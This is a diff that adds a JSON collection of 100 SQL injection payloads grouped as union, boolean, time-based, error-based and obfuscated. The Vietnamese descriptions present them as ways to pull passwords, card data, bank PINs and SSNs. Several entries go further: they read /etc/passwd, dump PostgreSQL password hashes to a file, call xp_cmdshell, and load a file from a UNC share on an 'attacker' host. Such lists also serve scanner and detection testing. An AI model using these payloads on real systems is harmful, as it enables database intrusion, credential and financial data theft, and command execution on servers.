@@ -1,0 +1,603 @@
+[
+  {
+    "name": "SQLi UNION #001",
+    "category": "sqli_union",
+    "payload": "id=1 UNION SELECT username, password FROM users -- 001",
+    "description": "Union select cơ bản nhằm trích xuất tài khoản."
+  },
+  {
+    "name": "SQLi UNION #002",
+    "category": "sqli_union",
+    "payload": "item=2 UNION SELECT email, pass_hash FROM members -- 002",
+    "description": "Khai thác bảng members thông qua UNION."
+  },
+  {
+    "name": "SQLi UNION #003",
+    "category": "sqli_union",
+    "payload": "product=3 UNION ALL SELECT credit_card, cvv FROM payments -- 003",
+    "description": "Union all để truy cập dữ liệu thẻ."
+  },
+  {
+    "name": "SQLi UNION #004",
+    "category": "sqli_union",
+    "payload": "uid=4 UNION SELECT login, password FROM admin_users -- 004",
+    "description": "Union lấy thông tin admin."
+  },
+  {
+    "name": "SQLi UNION #005",
+    "category": "sqli_union",
+    "payload": "page=5 UNION SELECT username, api_key FROM api_clients -- 005",
+    "description": "Nhắm tới bảng API clients."
+  },
+  {
+    "name": "SQLi UNION #006",
+    "category": "sqli_union",
+    "payload": "pid=6 UNION SELECT name, secret FROM secrets_store -- 006",
+    "description": "Union lấy dữ liệu trong bảng secrets."
+  },
+  {
+    "name": "SQLi UNION #007",
+    "category": "sqli_union",
+    "payload": "doc=7 UNION SELECT author, password FROM editors -- 007",
+    "description": "Union khai thác bảng editors."
+  },
+  {
+    "name": "SQLi UNION #008",
+    "category": "sqli_union",
+    "payload": "post=8 UNION SELECT username, token FROM social_accounts -- 008",
+    "description": "Union nhắm tới token mạng xã hội."
+  },
+  {
+    "name": "SQLi UNION #009",
+    "category": "sqli_union",
+    "payload": "ref=9 UNION SELECT customer_id, pin FROM banking_users -- 009",
+    "description": "Union lấy mã PIN ngân hàng."
+  },
+  {
+    "name": "SQLi UNION #010",
+    "category": "sqli_union",
+    "payload": "ord=10 UNION SELECT card_number, expiry FROM orders -- 010",
+    "description": "Union lấy thông tin thẻ từ bảng orders."
+  },
+  {
+    "name": "SQLi UNION #011",
+    "category": "sqli_union",
+    "payload": "entry=11 UNION SELECT login_name, passphrase FROM employees -- 011",
+    "description": "Union truy xuất đăng nhập nhân viên."
+  },
+  {
+    "name": "SQLi UNION #012",
+    "category": "sqli_union",
+    "payload": "row=12 UNION SELECT email, password FROM newsletter_subs -- 012",
+    "description": "Union truy cập dữ liệu newsletter."
+  },
+  {
+    "name": "SQLi UNION #013",
+    "category": "sqli_union",
+    "payload": "article=13 UNION SELECT username, hash FROM cms_users -- 013",
+    "description": "Union lấy hash người dùng CMS."
+  },
+  {
+    "name": "SQLi UNION #014",
+    "category": "sqli_union",
+    "payload": "invoice=14 UNION SELECT account, routing FROM banking_details -- 014",
+    "description": "Union lấy thông tin tài khoản ngân hàng."
+  },
+  {
+    "name": "SQLi UNION #015",
+    "category": "sqli_union",
+    "payload": "order_id=15 UNION SELECT ssn, dob FROM customers -- 015",
+    "description": "Union thu thập SSN và ngày sinh."
+  },
+  {
+    "name": "SQLi UNION #016",
+    "category": "sqli_union",
+    "payload": "ticket=16 UNION SELECT username, password FROM helpdesk_users -- 016",
+    "description": "Union khai thác hệ thống helpdesk."
+  },
+  {
+    "name": "SQLi UNION #017",
+    "category": "sqli_union",
+    "payload": "profile=17 UNION SELECT login, pass FROM staff -- 017",
+    "description": "Union truy cập thông tin staff."
+  },
+  {
+    "name": "SQLi UNION #018",
+    "category": "sqli_union",
+    "payload": "cid=18 UNION SELECT email, password FROM crm_accounts -- 018",
+    "description": "Union khai thác CRM."
+  },
+  {
+    "name": "SQLi UNION #019",
+    "category": "sqli_union",
+    "payload": "index=19 UNION SELECT username, pass_hash FROM forum_users -- 019",
+    "description": "Union lấy hash từ diễn đàn."
+  },
+  {
+    "name": "SQLi UNION #020",
+    "category": "sqli_union",
+    "payload": "report=20 UNION SELECT operator, passkey FROM system_users -- 020",
+    "description": "Union tìm passkey hệ thống."
+  },
+  {
+    "name": "SQLi Boolean #021",
+    "category": "sqli_boolean",
+    "payload": "id=21 OR '1'='1",
+    "description": "Boolean-based tầm thường."
+  },
+  {
+    "name": "SQLi Boolean #022",
+    "category": "sqli_boolean",
+    "payload": "user=22' OR 'a'='a",
+    "description": "Bypass xác thực với biểu thức đúng."
+  },
+  {
+    "name": "SQLi Boolean #023",
+    "category": "sqli_boolean",
+    "payload": "uid=23 AND 'x'='x",
+    "description": "Boolean injection dạng AND."
+  },
+  {
+    "name": "SQLi Boolean #024",
+    "category": "sqli_boolean",
+    "payload": "login=24' OR 1=1 --",
+    "description": "Thử đăng nhập với điều kiện luôn đúng."
+  },
+  {
+    "name": "SQLi Boolean #025",
+    "category": "sqli_boolean",
+    "payload": "name=25' OR 'test'='test",
+    "description": "Boolean injection so sánh chuỗi."
+  },
+  {
+    "name": "SQLi Boolean #026",
+    "category": "sqli_boolean",
+    "payload": "acct=26 OR 2>1",
+    "description": "So sánh số để bypass."
+  },
+  {
+    "name": "SQLi Boolean #027",
+    "category": "sqli_boolean",
+    "payload": "customer=27' OR '1'='1' -- -",
+    "description": "Chuỗi kết thúc bằng comment."
+  },
+  {
+    "name": "SQLi Boolean #028",
+    "category": "sqli_boolean",
+    "payload": "session=28' OR TRUE",
+    "description": "Sử dụng từ khóa TRUE."
+  },
+  {
+    "name": "SQLi Boolean #029",
+    "category": "sqli_boolean",
+    "payload": "profile=29 OR 99=99",
+    "description": "Check hằng đúng."
+  },
+  {
+    "name": "SQLi Boolean #030",
+    "category": "sqli_boolean",
+    "payload": "email=30' OR 'abc'<'zzz",
+    "description": "So sánh chuỗi alphabet."
+  },
+  {
+    "name": "SQLi Boolean #031",
+    "category": "sqli_boolean",
+    "payload": "id=31 AND '1'='1",
+    "description": "AND boolean injection."
+  },
+  {
+    "name": "SQLi Boolean #032",
+    "category": "sqli_boolean",
+    "payload": "user=32' OR EXISTS(SELECT 1) --",
+    "description": "Sử dụng EXISTS để trả TRUE."
+  },
+  {
+    "name": "SQLi Boolean #033",
+    "category": "sqli_boolean",
+    "payload": "order=33' OR NOT 'a'='b",
+    "description": "Boolean phủ định."
+  },
+  {
+    "name": "SQLi Boolean #034",
+    "category": "sqli_boolean",
+    "payload": "key=34 OR '1'='1' /*",
+    "description": "Kết thúc bằng comment C-style."
+  },
+  {
+    "name": "SQLi Boolean #035",
+    "category": "sqli_boolean",
+    "payload": "cat=35') OR ('1'='1",
+    "description": "Chèn dấu ngoặc để đóng câu lệnh."
+  },
+  {
+    "name": "SQLi Boolean #036",
+    "category": "sqli_boolean",
+    "payload": "token=36' OR 'aa' LIKE 'a%'",
+    "description": "Sử dụng LIKE để luôn đúng."
+  },
+  {
+    "name": "SQLi Boolean #037",
+    "category": "sqli_boolean",
+    "payload": "filter=37 OR '5' BETWEEN '4' AND '6'",
+    "description": "Sử dụng BETWEEN."
+  },
+  {
+    "name": "SQLi Boolean #038",
+    "category": "sqli_boolean",
+    "payload": "doc=38 OR COALESCE(NULL,1)=1",
+    "description": "Coalesce để trả về TRUE."
+  },
+  {
+    "name": "SQLi Boolean #039",
+    "category": "sqli_boolean",
+    "payload": "idx=39 OR LENGTH('abc')=3",
+    "description": "Sử dụng LENGTH."
+  },
+  {
+    "name": "SQLi Boolean #040",
+    "category": "sqli_boolean",
+    "payload": "product=40 OR POSITION('a' IN 'abc')=1",
+    "description": "Dùng POSITION."
+  },
+  {
+    "name": "SQLi Time #041",
+    "category": "sqli_time",
+    "payload": "id=41' OR IF(1=1, SLEEP(2), 0)--",
+    "description": "Time-based injection với IF."
+  },
+  {
+    "name": "SQLi Time #042",
+    "category": "sqli_time",
+    "payload": "user=42 AND SLEEP(3)#",
+    "description": "Time delay sử dụng AND."
+  },
+  {
+    "name": "SQLi Time #043",
+    "category": "sqli_time",
+    "payload": "item=43' OR benchmark(5000000,MD5('a'))--",
+    "description": "Benchmark để tạo độ trễ."
+  },
+  {
+    "name": "SQLi Time #044",
+    "category": "sqli_time",
+    "payload": "pid=44 AND IF('a'='a', SLEEP(4), 0)",
+    "description": "Điều kiện TRUE để sleep."
+  },
+  {
+    "name": "SQLi Time #045",
+    "category": "sqli_time",
+    "payload": "cid=45' AND (SELECT 1 FROM dual WHERE SLEEP(2))--",
+    "description": "Sleep trong subquery."
+  },
+  {
+    "name": "SQLi Time #046",
+    "category": "sqli_time",
+    "payload": "row=46 OR PG_SLEEP(3)",
+    "description": "Sử dụng hàm PG_SLEEP trên PostgreSQL."
+  },
+  {
+    "name": "SQLi Time #047",
+    "category": "sqli_time",
+    "payload": "ref=47'; IF(1=1, SLEEP(5), 0); --",
+    "description": "Time delay qua stacked IF."
+  },
+  {
+    "name": "SQLi Time #048",
+    "category": "sqli_time",
+    "payload": "order=48 OR WAITFOR DELAY '0:0:02'",
+    "description": "Delay trên SQL Server."
+  },
+  {
+    "name": "SQLi Time #049",
+    "category": "sqli_time",
+    "payload": "session=49' OR SLEEP(3)#",
+    "description": "Sleep trực tiếp trong comment hash."
+  },
+  {
+    "name": "SQLi Time #050",
+    "category": "sqli_time",
+    "payload": "profile=50 AND 1=IF(2>1,SLEEP(2),0)",
+    "description": "IF lồng ghép để sleep."
+  },
+  {
+    "name": "SQLi Time #051",
+    "category": "sqli_time",
+    "payload": "doc=51' OR (SELECT SLEEP(4))--",
+    "description": "Subselect sleep."
+  },
+  {
+    "name": "SQLi Time #052",
+    "category": "sqli_time",
+    "payload": "log=52 AND (SELECT 1 FROM users WHERE SLEEP(3))",
+    "description": "Sleep khi truy cập bảng users."
+  },
+  {
+    "name": "SQLi Time #053",
+    "category": "sqli_time",
+    "payload": "idx=53' OR IF((SELECT COUNT(*) FROM admins)>0,SLEEP(2),0)--",
+    "description": "Time-based kiểm tra tồn tại admins."
+  },
+  {
+    "name": "SQLi Time #054",
+    "category": "sqli_time",
+    "payload": "article=54 OR SLEEP(2)/*",
+    "description": "Sleep kèm comment."
+  },
+  {
+    "name": "SQLi Time #055",
+    "category": "sqli_time",
+    "payload": "entry=55' AND IF(ORD(SUBSTRING(user(),1,1))>0,SLEEP(3),0)--",
+    "description": "Blind time-based kiểm tra user()."
+  },
+  {
+    "name": "SQLi Time #056",
+    "category": "sqli_time",
+    "payload": "invoice=56 AND (SELECT SLEEP(2) FROM dual)",
+    "description": "Sleep qua dual table."
+  },
+  {
+    "name": "SQLi Time #057",
+    "category": "sqli_time",
+    "payload": "report=57' OR CASE WHEN (SELECT database()) IS NOT NULL THEN SLEEP(2) END--",
+    "description": "Case khi database() tồn tại."
+  },
+  {
+    "name": "SQLi Time #058",
+    "category": "sqli_time",
+    "payload": "note=58; IF(1=1, SLEEP(2), 0); --",
+    "description": "Stacked statement với IF."
+  },
+  {
+    "name": "SQLi Time #059",
+    "category": "sqli_time",
+    "payload": "param=59 OR (SELECT IFNULL(NULL,SLEEP(3)))",
+    "description": "Sử dụng IFNULL để tạo sleep."
+  },
+  {
+    "name": "SQLi Time #060",
+    "category": "sqli_time",
+    "payload": "category=60 AND RANDOMBLOB(1000000000)",
+    "description": "Tấn công time-based bằng tải nặng SQLite."
+  },
+  {
+    "name": "SQLi Error #061",
+    "category": "sqli_error",
+    "payload": "id=61 AND updatexml(1,concat(0x7e,(SELECT user())),0)",
+    "description": "Error-based dùng updatexml."
+  },
+  {
+    "name": "SQLi Error #062",
+    "category": "sqli_error",
+    "payload": "uid=62 AND extractvalue(1,concat(0x7e,(SELECT database())))",
+    "description": "Error-based extractvalue."
+  },
+  {
+    "name": "SQLi Error #063",
+    "category": "sqli_error",
+    "payload": "user=63 AND (SELECT 1/0)",
+    "description": "Gây lỗi chia cho 0 để lộ thông tin."
+  },
+  {
+    "name": "SQLi Error #064",
+    "category": "sqli_error",
+    "payload": "item=64 AND exp(~(SELECT * FROM (SELECT user())x))",
+    "description": "Error-based với toán tử bit."
+  },
+  {
+    "name": "SQLi Error #065",
+    "category": "sqli_error",
+    "payload": "product=65 AND cast((SELECT user()) AS int)",
+    "description": "Ép kiểu sai gây lỗi."
+  },
+  {
+    "name": "SQLi Error #066",
+    "category": "sqli_error",
+    "payload": "doc=66 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT version())a)",
+    "description": "Lỗi subselect với kiểu dữ liệu khác."
+  },
+  {
+    "name": "SQLi Error #067",
+    "category": "sqli_error",
+    "payload": "row=67 AND (SELECT name_const('a',1) FROM information_schema.tables GROUP BY 1)",
+    "description": "Error name_const duplicate."
+  },
+  {
+    "name": "SQLi Error #068",
+    "category": "sqli_error",
+    "payload": "page=68 AND (SELECT column_name FROM information_schema.columns GROUP BY column_name HAVING MIN(1)=MAX(0))",
+    "description": "Lỗi logic tạo error."
+  },
+  {
+    "name": "SQLi Error #069",
+    "category": "sqli_error",
+    "payload": "post=69 AND (SELECT 1 FROM dual WHERE (SELECT 1 FROM users LIMIT 1)=2)",
+    "description": "So sánh sai gây lỗi."
+  },
+  {
+    "name": "SQLi Error #070",
+    "category": "sqli_error",
+    "payload": "note=70 AND (SELECT TOP 1 table_name FROM information_schema.tables WHERE 1=CONVERT(int,'a'))",
+    "description": "SQL Server convert lỗi."
+  },
+  {
+    "name": "SQLi Error #071",
+    "category": "sqli_error",
+    "payload": "record=71 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))a FROM information_schema.tables GROUP BY a)b)",
+    "description": "Khai thác lỗi RAND duplication."
+  },
+  {
+    "name": "SQLi Error #072",
+    "category": "sqli_error",
+    "payload": "token=72 AND (SELECT TRIM(CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1))))--",
+    "description": "Trích dữ liệu qua lỗi concat."
+  },
+  {
+    "name": "SQLi Error #073",
+    "category": "sqli_error",
+    "payload": "param=73 AND (SELECT to_char(1/0) FROM dual)",
+    "description": "Error-based trong Oracle."
+  },
+  {
+    "name": "SQLi Error #074",
+    "category": "sqli_error",
+    "payload": "entry=74 AND (SELECT CAST((SELECT user()) AS numeric))",
+    "description": "Ép kiểu sai numeric."
+  },
+  {
+    "name": "SQLi Error #075",
+    "category": "sqli_error",
+    "payload": "key=75 AND (SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() GROUP BY 1)",
+    "description": "Group by lỗi do dữ liệu không hợp lệ."
+  },
+  {
+    "name": "SQLi Error #076",
+    "category": "sqli_error",
+    "payload": "filter=76 AND (SELECT updatexml(NULL,concat(0x7e,user()),NULL))",
+    "description": "Khai thác updatexml null."
+  },
+  {
+    "name": "SQLi Error #077",
+    "category": "sqli_error",
+    "payload": "idx=77 AND (SELECT exp(111111111111))",
+    "description": "Tạo overflow để gây lỗi."
+  },
+  {
+    "name": "SQLi Error #078",
+    "category": "sqli_error",
+    "payload": "node=78 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE' HAVING 1=2)",
+    "description": "Điều kiện HAVING sai gây error."
+  },
+  {
+    "name": "SQLi Error #079",
+    "category": "sqli_error",
+    "payload": "report=79 AND (SELECT geometrycollectionfromtext('POINT(1 1)'))",
+    "description": "Hàm hình học gây lỗi trong MySQL."
+  },
+  {
+    "name": "SQLi Error #080",
+    "category": "sqli_error",
+    "payload": "category=80 AND (SELECT CAST(NULL AS xml))",
+    "description": "SQL Server XML cast gây lỗi."
+  },
+  {
+    "name": "SQLi Obfuscated #081",
+    "category": "sqli_obfuscated",
+    "payload": "id=81/**/UNION/**/SELECT/**/user,pass/**/FROM/**/users",
+    "description": "Sử dụng comment chèn giữa từ khóa."
+  },
+  {
+    "name": "SQLi Obfuscated #082",
+    "category": "sqli_obfuscated",
+    "payload": "item=82/*!50000UNION*/SELECT username,password FROM accounts",
+    "description": "Comment điều kiện của MySQL."
+  },
+  {
+    "name": "SQLi Obfuscated #083",
+    "category": "sqli_obfuscated",
+    "payload": "user=83/**/OR/**/'1'='1",
+    "description": "Obfuscate boolean injection."
+  },
+  {
+    "name": "SQLi Obfuscated #084",
+    "category": "sqli_obfuscated",
+    "payload": "uid=84%27%20OR%201%3D1%20--%20",
+    "description": "URL-encoded injection."
+  },
+  {
+    "name": "SQLi Obfuscated #085",
+    "category": "sqli_obfuscated",
+    "payload": "product=85'||(SELECT%201%20WHERE%20'1'='1)||'",
+    "description": "Obfuscate với concatenation."
+  },
+  {
+    "name": "SQLi Obfuscated #086",
+    "category": "sqli_obfuscated",
+    "payload": "name=86'/**/UNION/**/SELECT/**/NULL,user(),@@version#",
+    "description": "Union ẩn với comment."
+  },
+  {
+    "name": "SQLi Obfuscated #087",
+    "category": "sqli_obfuscated",
+    "payload": "order=87%27%20UNION%20SELECT%20hex(username),hex(password)%20FROM%20users%20--",
+    "description": "Dữ liệu trả về ở dạng hex."
+  },
+  {
+    "name": "SQLi Obfuscated #088",
+    "category": "sqli_obfuscated",
+    "payload": "id=88%2527%2520OR%25201%253D1%2520--",
+    "description": "Double-encoded injection."
+  },
+  {
+    "name": "SQLi Obfuscated #089",
+    "category": "sqli_obfuscated",
+    "payload": "ref=89'+CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)+' SELECT login,password FROM admins --",
+    "description": "Dùng CHAR() để xây dựng từ khóa."
+  },
+  {
+    "name": "SQLi Obfuscated #090",
+    "category": "sqli_obfuscated",
+    "payload": "profile=90') UNION SELECT load_file('\\\\\\\\attacker\\\\share'), NULL --",
+    "description": "Union đọc file qua UNC path."
+  },
+  {
+    "name": "SQLi Obfuscated #091",
+    "category": "sqli_obfuscated",
+    "payload": "row=91 union/**/select/**/concat_ws(0x3a,username,password),NULL from users --",
+    "description": "Concat_ws với hex separator."
+  },
+  {
+    "name": "SQLi Obfuscated #092",
+    "category": "sqli_obfuscated",
+    "payload": "entry=92%27%20UNION%20SELECT%20NULL,0x61646d696e,0x70617373%20--",
+    "description": "Union với dữ liệu hex 'admin','pass'."
+  },
+  {
+    "name": "SQLi Obfuscated #093",
+    "category": "sqli_obfuscated",
+    "payload": "doc=93') OR ('x'='x'/*",
+    "description": "Kết thúc bằng comment để bỏ phần sau."
+  },
+  {
+    "name": "SQLi Obfuscated #094",
+    "category": "sqli_obfuscated",
+    "payload": "note=94'||chr(39)||' OR '1'='1",
+    "description": "Sử dụng chr() trong Oracle."
+  },
+  {
+    "name": "SQLi Obfuscated #095",
+    "category": "sqli_obfuscated",
+    "payload": "invoice=95'; EXEC xp_cmdshell('dir'); --",
+    "description": "Stacked query gọi stored procedure nguy hiểm."
+  },
+  {
+    "name": "SQLi Obfuscated #096",
+    "category": "sqli_obfuscated",
+    "payload": "param=96%27%20/*!50000UNION%20SELECT*/%20NULL,@@version%20--",
+    "description": "Comment conditional MySQL 5."
+  },
+  {
+    "name": "SQLi Obfuscated #097",
+    "category": "sqli_obfuscated",
+    "payload": "id=97+UNION+SELECT+NULL,group_concat(username,0x3a,password)+FROM+users+--",
+    "description": "Group_concat với hex separator."
+  },
+  {
+    "name": "SQLi Obfuscated #098",
+    "category": "sqli_obfuscated",
+    "payload": "order=98%27%20UNION%20ALL%20SELECT%20NULL,LOAD_FILE('/etc/passwd')%20--",
+    "description": "Union đọc file hệ thống."
+  },
+  {
+    "name": "SQLi Obfuscated #099",
+    "category": "sqli_obfuscated",
+    "payload": "uid=99%27;COPY+(SELECT+passwd+FROM+pg_shadow)+TO+%27/tmp/out99%27;--",
+    "description": "Stacked query trên PostgreSQL."
+  },
+  {
+    "name": "SQLi Obfuscated #100",
+    "category": "sqli_obfuscated",
+    "payload": "entry=100%27%20UNION%20SELECT%20NULL,XMLTYPE(CHR(60)||CHR(97)||CHR(62))%20FROM%20dual%20--",
+    "description": "Oracle XMLTYPE với chr() để né detection."
+  }
+]
+
